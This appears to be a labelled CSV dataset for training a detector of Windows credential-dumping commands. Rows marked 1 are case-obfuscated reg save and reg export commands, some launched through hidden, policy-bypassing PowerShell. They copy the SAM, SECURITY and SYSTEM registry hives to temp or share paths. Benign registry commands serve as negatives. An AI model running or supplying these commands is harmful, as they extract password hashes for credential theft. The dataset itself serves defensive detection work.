text,label
"rEg.eXE QuERy ""hKey_uSErs\hkEY_LocAL_MachinE\SysteM\cUrrenTConTroLSeT\ConTROL\subkEy3"" /F",0
powershell -exec bypass -w hidden -c reg export  hklm\system c:\windows\temp\sam.save  /y,1
cmd.exe /c reg save hkey_local_machine\security  c:\users\public\registry_export.reg,1
cmd.exe /c REG.exe eXporT   hKlM\SaM  %TeMP%\sec_bacKup.DAT /y,1
reg save,0
"REG.eXE unLoAd ""hKU\HkeY_lOcAL_machiNE\SysTEM\CURrEnTcOntRolseT\coNtrOL\suBKeY57"" /V pAth",0
"cmd /c powershell -c ""reg  export hkey_local_machine\security  c:\temp\system.hive   /y""",1
"cmd /c powershell -c ""reg   save  hklm\security  c:\users\public\registry_export.reg   /y""",1
reg  Save   hKLM\SysTeM \\LoCALHoST\c$\__dUmp\SAM.BaK,1
"Reg.EXe  rEStore  ""HkEy_CurREnT_USEr\sysTem\cURRentconTRolSeT\SErVICes\sUBKEy78""  ""Hkey_CUrrenT_uSER\ContrOl paNEl\DeSKtOp_423""",0
"reg   restore   ""hkey_local_machine\control panel\desktop\subkey37""   ""hkey_local_machine\software\classes_187""",0
cmD.eXe /C reg   SAve HKlM\sAM   C:\uSers\PUblic\regIstRy_ExPORT.ReG,1
PWsH -noPROfilE -c REg.exe  ExPORt   hKEy_locaL_machiNe\sAM %teMp%\Sec_BaCkUp.dat /y,1
"sTaRt /B REg.eXE CoMPARE ""hKU\hKey_LoCAL_MAcHIne\sysTEM\cuRrentcONTRoLsET\cONtRol\SUbKey59"" ""HkU\CoNTROl PAnEl\desKtOP_536""",0
"reg.exE unloAd ""HKcu\hKEY_loCAL_mAChINe\sofTWARE\pOLicIEs\micrOsOFT"" /V paTH",0
"rEG.eXe  aDd  ""hKCu\EnVIROnmeNt""    /T rEG_dWord  /d 1",0
c:\windows\system32\cmd.exe /k reg.exe export   hkey_local_machine\system   \.\c$ackup.reg   /y,1
rEg  eXPOrt   hklM\sam   \\LOcaLHOSt\c$\__duMP\sAM.baK   /Y,1
"STaRT /b ReG  DEleTe  ""hku\conTrol pAnEL\DEsKtOP""  /v lAStupDATe",0
pwsH -nOPrOfile -c rEG  SaVE Hklm\Sam  C:\winDOWs\TEmp\SAm.sAVE   /y,1
CMD.exe /c staRt /b REg sAve HkeY_LoCal_MACHInE\SYStem  C:\USeRs\pUbLIC\RegiSTRy_eXPORt.ReG   /Y,1
C:\wiNDOWs\sySTem32\CmD.eXe /k Reg   SaVE HKEY_lOcAL_mAChINe\sam   \\loCaLhOST\C$\__DUMP\Sam.bak   /y,1
REG.Exe saVe  HkeY_Local_mAcHiNE\SEcUriTY  %TemP%\sec_BacKUP.DAT,1
"Reg.exE  unlOAd  ""hkEy_LoCAl_mACHINe\soFtwaRE\gOoGlE\cHrOme\SubKeY86""  /V Path",0
PowErShELl -COMmAND rEg  sAve hklm\seCuRitY  \\LoCalHoSt\C$\__dumP\sam.bak,1
"rEG QUERY ""hkEY_USers\HKey_LoCAl_mAchIne\soFtwAre\wow6432nodE\sUBkeY77"" /v PatH",0
"Cmd /c PoWErshelL -C ""rEG eXport   hkey_loCAL_MachINE\SaM   C:\USErS\pUbLIC\ReGiSTRy_exPOrT.rEG  /y""",1
"reg.Exe QUERy ""HKeY_useRs\SofTwAre\MIcROsoFT\wiNDOws\cUrreNTveRSiON"" /V PAtH",0
REG.exe eXPOrt   HkLM\SaM   \.\c$acKUp.REg /y,1
CMd.EXE /c Reg.eXE   SAVe  hKLm\System  c:\Temp\SYSTEm.HIVE,1
CMD.ExE /C stARt /B REG.Exe  eXPORt  HklM\SYsteM %TEmP%\SEC_bAcKuP.Dat,1
"reg   SaVE   ""hkEY_LOcal_mACHINe\HkeY_LoCAl_mAchinE\sYSteM\currEnTcONTrOlsET\cONTroL\suBkEy14""   ""d:\bAcKuP\reGIStrY_hIve.DAT""",0
powershell -exec bypass -w hidden -c reg save hklm\system  c:\windows\temp\sam.save   /y,1
reG.EXe SaVE   hKlm\saM \.\C$ACkuP.REg  /Y,1
"rEg  add  ""hKey_UserS\SoFtWaRE\MYAPp\SEtTiNgs\subkey54""  /v LaSTuPdaTE  /T reg_DWOrD  /D ""1.0.0""",0
"reg  unload  ""hkey_local_machine\software\microsoft\windows\currentversion\subkey31""  /v lastupdate",0
C:\WiNdoWs\SysTeM32\CMd.eXe /k Reg  SAVE HKlm\sEcUriTY  c:\USeRs\PuBLic\rEgisTrY_eXPORt.rEg /Y,1
"reg  query  ""hkey_local_machine\control panel\desktop\subkey79""",0
PoWErshell -COmMand reG ExpORT hKey_LOcAL_MAcHIne\SecUriTy \.\C$AcKup.rEG   /y,1
"reg COmpArE ""hkEY_lOCAl_machIne\soFTWaRE\PoLIcIes\MYcORp"" ""hKEy_LoCaL_maCHIne\hKeY_LocaL_macHInE\sOFtwARe\polIciES\miCrOsofT_257""",0
"REg.ExE DeLEte ""hKU\soFTwARe\MicROsofT\WINdowS\CurRenTveRSIoN\SuBkey29"" /V VeRsioN",0
c:\WINdOWs\SysTem32\Cmd.Exe /k ReG.EXE   Save  HklM\SAM C:\usERS\PUbLIc\ReGISTRy_eXPoRT.ReG  /y,1
pwSH -NOPrOFiLe -c reG  ExPort  Hklm\seCURITY  %TeMP%\seC_baCkUp.daT,1
"Reg dELeTe ""hkU\sYsTeM\CURRENTCoNTrolSeT\seRVIceS""",0
"CMD /c ReG   query   ""hKEy_UseRs\SOftwArE\cLasSEs\sUBkeY77""   /v laStUpDATe",0
cmD.eXe /C sTarT /b rEG  exPoRt hKey_lOCaL_mACHiNe\sECurItY \.\c$AcKup.reg,1
cMD.eXE /c REG.eXe  EXpoRT  hkeY_LOCAl_MachInE\sAm %teMP%\seC_bacKuP.dAT /Y,1
pwsh -noprofile -c reg  save hklm\system \\localhost\c$\__dump\sam.bak,1
C:\WIndows\SYsteM32\cmD.exe /K rEg  savE  Hkey_lOCal_MachInE\sam \\lOcaLhOsT\C$\__DuMP\sam.bAk,1
"REG cOMPARe ""Hkey_USers\hkeY_loCAl_macHIne\sOftwArE\POlIcIes\miCrOSoFt\SubKEY7"" ""hkEY_UseRs\HKEY_locAL_maCHiNE\SofTWAre\poLiCieS\MiCROSofT_253""",0
"STArt /B ReG.eXE uNloaD ""HKEy_UsErs\HkEy_lOCal_maCHine\sOFTWaRE\wOw6432node"" /V VERsIOn",0
"cmd /C POwErshELL -C ""rEG saVE  Hkey_LOCAL_MachINE\sYsTEM   %tEmp%\SEc_bAckuP.dAt""",1
"reg query ""hkey_current_user\software\microsoft\windows\currentversion\subkey83"" /f",0
CMd.exE /C StARt /b ReG ExPorT hkLM\Sam   c:\USErS\PUBLIC\regIstrY_eXPorT.reG /Y,1
c:\WIndoWS\sYstem32\cmd.exe /K rEG.Exe ExPORt  HKLM\system \.\c$AckuP.rEG,1
"CmD /C ReG.Exe  delETE  ""hKeY_UserS\sOFtWAre\clASSes\sUbKEY60""  /V PAtH",0
"reg.exe   delete   ""hkey_current_user\system\currentcontrolset\services""   /v path",0
attrib -h -s C:\temp\my_file.txt,0
pwsH -NoPRoFIle -c reG  EXporT hklm\sECuRiTY   C:\useRs\pUbLIc\rEgiSTry_ExPoRT.REg,1
"cmd /c powershell -c ""reg.exe   export  hklm\system  c:\users\public\registry_export.reg /y""",1
"POWERSheLl -C rEg.Exe   Query   ""HKCu\HKeY_lOCAl_MaCHInE\sOftWarE\wOw6432NodE""   /V lAstuPdaTe",0
cmd.exe /c start /b reg.exe   save  hklm\sam   \.\c$ackup.reg /y,1
CMD.eXE /C Reg   ExPorT HKeY_Local_maChINe\SeCURity \\LoCalhOsT\C$\__Dump\Sam.Bak  /Y,1
"powershell -c reg add ""hkey_users\software\google\chrome"" /v lastupdate /t reg_dword",0
PoweRSHEll -COMmand rEG.eXE   savE   HkEy_LOcaL_MacHINE\saM   c:\UsERs\PUBlIc\reGIstRY_expORT.rEG /y,1
"start /b reg.exe  restore  ""hkey_current_user\software\classes\subkey2""  ""hkey_current_user\software\myapp\settings_791""",0
"cmd /C PowersHELL -C ""reg.ExE eXpORT  hKLm\seCURiTy C:\UserS\PUbLiC\REGIstRy_eXPort.REG   /y""",1
"start /b reg.exe   unload   ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control\subkey100""   /f",0
reg exPorT hkeY_LOcal_MAchINe\Sam %Temp%\sEc_BAcKUP.DAt,1
cmd.exe /c start /b reg.exe export   hklm\system  \.\c$ackup.reg,1
"powERSHeLl -C rEg.Exe  queRy  ""HkEy_uSErS\hKey_loCal_mAcHINe\SoftwaRe\WoW6432nOde""  /V lAstUPdatE",0
powershell -exec bypass -w hidden -c reg.exe  save   hklm\security   c:\temp\system.hive,1
"rEg.EXe  DEleTe  ""HKcU\SYstem\CuRRENtcontRoLsET\serVICes\SUbKey54""  /v PaTh",0
Reg  ExpOrT  hkey_LoCaL_macHINE\saM \.\C$aCkUp.ReG,1
"PowERShelL -c ReG.exe   dEletE   ""HkEY_cUrRent_useR\conTROL pANeL\DEsKtOP""   /F",0
"reG.eXE aDd ""hkEy_CurReNt_useR\SoFTwaRe\pOlicies\MyCOrP"" /v LAstuPDAtE  /d ""1.0.0""",0
poWErShELl -CoMMand reG ExPOrT  HklM\sySTeM   %TeMp%\sEC_bAckuP.Dat,1
reg  export hklm\security %temp%\sec_backup.dat,1
cmd.exe /c reg.exe   export hkey_local_machine\security %temp%\sec_backup.dat   /y,1
"ReG.eXe   UnlOAD   ""HkU\SOFTWaRe\MICrosofT\wINDoWs\curreNtversIOn""   /f",0
pwsh -noprofile -c reg.exe save hkey_local_machine\sam \.\c$ackup.reg,1
"cmd /c powershell -c ""reg   export   hkey_local_machine\security c:\temp\system.hive  /y""",1
pOwershell -EXeC BYpass -W HidDEn -C rEg.ExE SAve  hkEy_LOCal_mAchInE\sYStEM  \\lOcAlHOSt\C$\__dUmp\sAM.bAk /y,1
"Reg CoMPaRe ""hkU\sOFtwARe\clAsseS"" ""HkU\SoftWAre\Myapp\SEttiNgs_453""",0
"cMD /c Reg.ExE  dEletE  ""HkEY_CurreNT_user\hkEY_loCal_MAchIne\sOFTWARe\wow6432node\SuBKEY14""  /v PATh",0
"reG.eXe   AdD   ""HKey_cuRRent_uSer\softwARE\Myapp\sEttiNGS\SUBkey8""      /T Reg_SZ   /D ""c:\pROGRaM FILeS\apP""",0
pWSh -NoProfiLe -C ReG.Exe  savE HKEy_LocAl_MAchiNe\sECurity  c:\Temp\SySTEm.hivE,1
"stArt /b reG   resTORe   ""hKey_cuRrENt_useR\eNVIRONmeNT\SUbkEY94""   ""HkEY_CuRRent_User\sOFTWArE\cLaSses_833""",0
REG.exe  EXpOrt   hkLm\sAm  %teMP%\sec_bAcKUp.DAT,1
Pwsh -NOPRoFIlE -C rEG SAVE   HKEy_lOcAL_maCHINE\SeCuRiTy c:\USERS\PUblIc\rEgisTRy_EXpORT.REg,1
CMd.eXE /C REG  ExPORt hKLM\SYsTeM   %TEmp%\seC_bAcKUp.DAt   /Y,1
